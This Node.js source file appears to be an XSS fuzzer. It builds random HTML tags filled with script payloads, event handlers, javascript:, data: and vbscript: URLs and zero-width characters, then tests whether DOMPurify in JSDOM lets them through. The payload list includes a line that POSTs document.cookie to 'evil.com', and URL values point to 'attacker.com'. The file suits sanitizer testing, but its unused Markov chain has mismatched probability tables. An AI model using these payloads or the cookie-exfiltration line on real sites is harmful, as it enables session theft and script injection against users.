const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
const crypto = require('crypto');
const fs = require('fs').promises;

class MarkovChain {
  constructor(transitionMatrix) {
    this.transitionMatrix = transitionMatrix;
    this.states = Object.keys(transitionMatrix);
  }

  generateSequence(startState, length) {
    let currentState = startState;
    let sequence = [currentState];

    for (let i = 1; i < length; i++) {
      const nextState = this.getNextState(currentState);
      sequence.push(nextState);
      currentState = nextState;
    }

    return sequence.join('');
  }

  getNextState(currentState) {
    const probabilities = this.transitionMatrix[currentState];
    const random = Math.random();
    let sum = 0;

    for (let i = 0; i < probabilities.length; i++) {
      sum += probabilities[i];
      if (random <= sum) {
        return this.states[i];
      }
    }

    return this.states[0]; // fallback to the first state
  }
}

class CharacterInjector {
  constructor() {
    this.injectionPoints = new Map();
    this.characters = ['\u200B', '\u200C', '\u200D', '\uFEFF', '\u00A0', '\u202C', '\u202D'];
  }

  addInjectionPoint(point, success) {
    if (!this.injectionPoints.has(point)) {
      this.injectionPoints.set(point, { successes: 0, attempts: 0 });
    }
    const stats = this.injectionPoints.get(point);
    stats.attempts++;
    if (success) {
      stats.successes++;
    }
  }

  getInjectionPoint() {
    if (this.injectionPoints.size === 0) {
      return 0; // Default to injecting at the start if no points are available
    }

    const points = Array.from(this.injectionPoints.entries());
    const totalWeight = points.reduce((sum, [, stats]) => sum + (stats.successes / stats.attempts || 0), 0);

    if (totalWeight === 0) {
      // If all weights are zero, choose a random point
      return points[Math.floor(Math.random() * points.length)][0];
    }

    let random = Math.random() * totalWeight;
    for (const [point, stats] of points) {
      const weight = stats.successes / stats.attempts || 0;
      random -= weight;
      if (random <= 0) {
        return point;
      }
    }
    return points[0][0];
  }

  injectCharacter(payload) {
    const point = this.getInjectionPoint();
    const char = this.characters[Math.floor(Math.random() * this.characters.length)];
    const injectedPayload = payload.slice(0, point) + char + payload.slice(point);

    // Log for debugging
    console.log(`Injected Payload: ${injectedPayload}`);

    return injectedPayload;
  }
}

class PayloadGenerator {
  constructor(config) {
    this.config = config;
    this.window = new JSDOM('', { runScripts: "dangerously" }).window;
    this.DOMPurify = createDOMPurify(this.window);
    this.uniquePayloads = new Set();
    this.results = [];

    this.transitionMatrix = {
      'alert(': [0.5, 0.25, 0.25],
      '1': [0, 0.5, 0.5],
      ')': [1, 0, 0],
      'document.cookie': [0.33, 0.33, 0.34],
      'document.domain': [0.33, 0.33, 0.34],
      'document.location': [0.33, 0.33, 0.34]
    };

    this.markovChain = new MarkovChain(this.transitionMatrix);

    this.validTags = [
      'a', 'abbr', 'address', 'area', 'article', 'aside', 'audio', 'b', 'base', 'bdi', 'bdo', 'blockquote', 'body',
      'br', 'button', 'canvas', 'caption', 'cite', 'code', 'col', 'colgroup', 'data', 'datalist', 'dd', 'del',
      'details', 'dfn', 'dialog', 'div', 'dl', 'dt', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'footer',
      'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hr', 'html', 'i', 'iframe', 'img', 'input',
      'ins', 'kbd', 'label', 'legend', 'li', 'link', 'main', 'map', 'mark', 'meta', 'meter', 'nav', 'noscript',
      'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rb', 'rp',
      'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'small', 'source', 'span', 'strong', 'style',
      'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time',
      'title', 'tr', 'track', 'u', 'ul', 'var', 'video', 'wbr'
    ];

    this.globalAttributes = [
      'accesskey', 'class', 'contenteditable', 'dir', 'draggable', 'hidden', 'id', 'lang', 'spellcheck', 'style',
      'tabindex', 'title', 'translate'
    ];

    this.eventHandlers = [
      'onabort', 'onblur', 'oncancel', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'onclose',
      'oncontextmenu', 'oncuechange', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover',
      'ondragstart', 'ondrop', 'ondurationchange', 'onemptied', 'onended', 'onerror', 'onfocus', 'oninput',
      'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart',
      'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup',
      'onmousewheel', 'onpause', 'onplay', 'onplaying', 'onprogress', 'onratechange', 'onreset', 'onresize',
      'onscroll', 'onseeked', 'onseeking', 'onselect', 'onshow', 'onstalled', 'onsubmit', 'onsuspend', 'ontimeupdate',
      'ontoggle', 'onvolumechange', 'onwaiting'
    ];

    this.specificAttributes = {
      'a': ['href', 'target', 'download', 'rel', 'hreflang', 'type', 'referrerpolicy'],
      'audio': ['src', 'autoplay', 'controls', 'loop', 'muted', 'preload'],
      'button': ['autofocus', 'disabled', 'form', 'formaction', 'formenctype', 'formmethod', 'formnovalidate', 'formtarget', 'name', 'type', 'value'],
      'canvas': ['height', 'width'],
      'form': ['action', 'autocomplete', 'enctype', 'method', 'name', 'novalidate', 'target'],
      'img': ['src', 'alt', 'height', 'width', 'loading', 'srcset', 'sizes', 'crossorigin', 'usemap', 'ismap'],
      'input': ['type', 'name', 'value', 'checked', 'placeholder', 'required', 'autocomplete', 'autofocus', 'disabled', 'form', 'list', 'max', 'maxlength', 'min', 'multiple', 'pattern', 'readonly', 'size', 'src', 'step'],
      'iframe': ['src', 'srcdoc', 'name', 'sandbox', 'allow', 'allowfullscreen', 'width', 'height', 'loading', 'referrerpolicy'],
      'link': ['href', 'rel', 'type', 'media', 'sizes', 'crossorigin', 'integrity', 'referrerpolicy'],
      'meta': ['name', 'content', 'charset', 'http-equiv'],
      'script': ['src', 'type', 'async', 'defer', 'crossorigin', 'integrity', 'nomodule', 'referrerpolicy'],
      'select': ['autofocus', 'disabled', 'form', 'multiple', 'name', 'required', 'size'],
      'source': ['src', 'type', 'srcset', 'sizes', 'media'],
      'style': ['type', 'media'],
      'table': ['border'],
      'td': ['colspan', 'rowspan', 'headers'],
      'textarea': ['autofocus', 'cols', 'disabled', 'form', 'maxlength', 'name', 'placeholder', 'readonly', 'required', 'rows', 'wrap'],
      'video': ['src', 'autoplay', 'controls', 'height', 'loop', 'muted', 'poster', 'preload', 'width']
    };

    this.predefinedPayloads = [
      "alert(1)", "alert('XSS')", "confirm('XSS')", "prompt('XSS')",
      "eval('alert(1)')", "setTimeout('alert(1)', 0)", "setInterval('alert(1)', 100)",
      "new Function('alert(1)')()", "window.location='javascript:alert(1)'",
      "document.write('<img src=x onerror=alert(1)>')", "fetch('https://evil.com', {method: 'POST', body: document.cookie})"
    ];

    this.characterInjector = new CharacterInjector();
  }

  generatePayload() {
    const tag = this.getRandomItem(this.validTags);
    const attributes = this.generateAttributes(tag);
    const content = this.generateContent(tag);

    let payload;
    if (this.isSelfClosingTag(tag)) {
      payload = `<${tag}${attributes}>`;
    } else {
      payload = `<${tag}${attributes}>${content}</${tag}>`;
    }

    // Apply character injection
    payload = this.characterInjector.injectCharacter(payload);

    // Log the payload for debugging
    console.log(`Generated Payload: ${payload}`);

    return payload;
  }

  generateAttributes(tag) {
    let attributes = '';
    // Iterate through global attributes
    this.globalAttributes.forEach(attr => {
      const value = this.generateAttributeValue();
      attributes += ` ${attr}="${value}"`;
    });

    // Iterate through event handlers
    this.eventHandlers.forEach(attr => {
      const value = this.getRandomItem(this.predefinedPayloads);
      attributes += ` ${attr}="${value}"`;
    });

    // Iterate through specific attributes for the tag
    if (this.specificAttributes[tag]) {
      this.specificAttributes[tag].forEach(attr => {
        const value = ['src', 'href', 'data', 'action', 'formaction'].includes(attr)
          ? this.generateURLValue()
          : this.generateAttributeValue();
        attributes += ` ${attr}="${value}"`;
      });
    }

    return attributes;
  }

  generateContent(tag) {
    if (tag === 'script') {
      return this.getRandomItem(this.predefinedPayloads);
    } else if (['style', 'textarea'].includes(tag)) {
      return this.generateTextContent();
    } else if (Math.random() < 0.3) {
      return this.getRandomItem(this.predefinedPayloads);
    } else {
      return this.generateTextContent();
    }
  }

  generateURLValue() {
    const urlTypes = [
      () => 'http://example.com',
      () => 'https://attacker.com',
      () => 'javascript:' + this.getRandomItem(this.predefinedPayloads),
      () => 'data:text/html;base64,' + Buffer.from(`<script>${this.getRandomItem(this.predefinedPayloads)}</script>`).toString('base64'),
      () => `data:application/x-javascript,${encodeURIComponent(this.getRandomItem(this.predefinedPayloads))}`,
      () => 'vbscript:' + this.getRandomItem(this.predefinedPayloads),
    ];
    return this.getRandomItem(urlTypes)();
  }

  generateAttributeValue() {
    return Math.random().toString(36).substring(2, 8);
  }

  generateTextContent() {
    return Math.random().toString(36).substring(2, 15);
  }

  isSelfClosingTag(tag) {
    return ['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'param', 'source', 'track', 'wbr'].includes(tag);
  }

  getRandomItem(array) {
    if (!array || !array.length) {
      throw new Error("Array is either undefined or empty");
    }
    return array[Math.floor(Math.random() * array.length)];
  }

  testPayload(payload) {
    const originalContent = this.window.document.body.innerHTML;
    const sanitized = this.DOMPurify.sanitize(payload);

    const bypassed = sanitized === payload;
    let alertTriggered = false;

    // Set up alert detection
    this.window.alert = () => { alertTriggered = true; };

    try {
      // Attempt to trigger potential XSS
      this.window.document.body.innerHTML = sanitized;

      // Execute scripts
      const scripts = this.window.document.body.getElementsByTagName('script');
      for (let script of scripts) {
        this.window.eval(script.textContent);
      }

      // Trigger events
      const elements = this.window.document.body.getElementsByTagName('*');
      for (let element of elements) {
        for (let attr of element.attributes) {
          if (attr.name.toLowerCase().startsWith('on')) {
            const eventName = attr.name.slice(2);
            const event = new this.window.Event(eventName);
            element.dispatchEvent(event);
          }
        }
      }

      // Test URL attributes
      const urlAttributes = ['src', 'href', 'action', 'formaction'];
      for (let element of elements) {
        for (let attr of urlAttributes) {
          if (element.hasAttribute(attr)) {
            const value = element.getAttribute(attr);
            if (value.startsWith('javascript:')) {
              this.window.eval(decodeURIComponent(value.slice(11)));
            }
          }
        }
      }

    } catch (e) {
      console.error('Error during payload execution:', e);
    } finally {
      // Restore original alert and document state
      this.window.document.body.innerHTML = originalContent;
    }

    // Log for debugging
    console.log(`Original: ${payload}`);
    console.log(`Sanitized: ${sanitized}`);
    console.log(`Bypassed: ${bypassed}`);
    console.log(`Alert Triggered: ${alertTriggered}`);

    return {
      original: payload,
      sanitized: sanitized,
      bypassed: bypassed,
      alertTriggered: alertTriggered
    };
  }

  async fuzz(maxIterations = Infinity) {
    let iterations = 0;
    let bypassedPayloads = 0;
    let alertTriggeringPayloads = 0;
    let startTime = Date.now();

    console.log('Starting fuzzing process...');

    while (iterations < maxIterations) {
      const payload = this.generatePayload();

      if (!this.isUniquePayload(payload)) continue;

      const result = this.testPayload(payload);

      if (result.bypassed || result.alertTriggered) {
        this.results.push(result);
        if (result.bypassed) bypassedPayloads++;
        if (result.alertTriggered) alertTriggeringPayloads++;
        console.log(`[${new Date().toISOString()}] Interesting payload found:`, {
          original: result.original,
          sanitized: result.sanitized,
          bypassed: result.bypassed,
          alertTriggered: result.alertTriggered
        });
        this.characterInjector.addInjectionPoint(payload.length, result.bypassed || result.alertTriggered);
      }

      iterations++;
      if (iterations % 10000 === 0) {
        const elapsedTime = (Date.now() - startTime) / 1000;
        const payloadsPerSecond = iterations / elapsedTime;
        console.log(`[${new Date().toISOString()}] Progress: ${iterations} payloads processed, ` +
          `${bypassedPayloads} bypassed, ${alertTriggeringPayloads} alert-triggering. ` +
          `Speed: ${payloadsPerSecond.toFixed(2)} payloads/sec`);

        await this.saveResults();
      }

      if (iterations % 1000 === 0) {
        await new Promise(resolve => setImmediate(resolve));
      }
    }

    const totalTime = (Date.now() - startTime) / 1000;
    console.log(`\nFuzzing completed in ${totalTime.toFixed(2)} seconds.`);
    console.log(`Total payloads tested: ${iterations}`);
    console.log(`Bypassed payloads found: ${bypassedPayloads}`);
    console.log(`Alert-triggering payloads found: ${alertTriggeringPayloads}`);

    await this.saveResults();

    return this.results;
  }

  isUniquePayload(payload) {
    const hash = crypto.createHash('sha256').update(payload).digest('hex');
    if (this.uniquePayloads.has(hash)) {
      return false;
    }
    this.uniquePayloads.add(hash);
    return true;
  }

  async saveResults() {
    try {
      await fs.writeFile(`xss_fuzzer_results_${process.pid}.json`, JSON.stringify(this.results, null, 2));
    } catch (error) {
      console.error('Error saving results to file:', error);
    }
  }
}

module.exports = { PayloadGenerator };
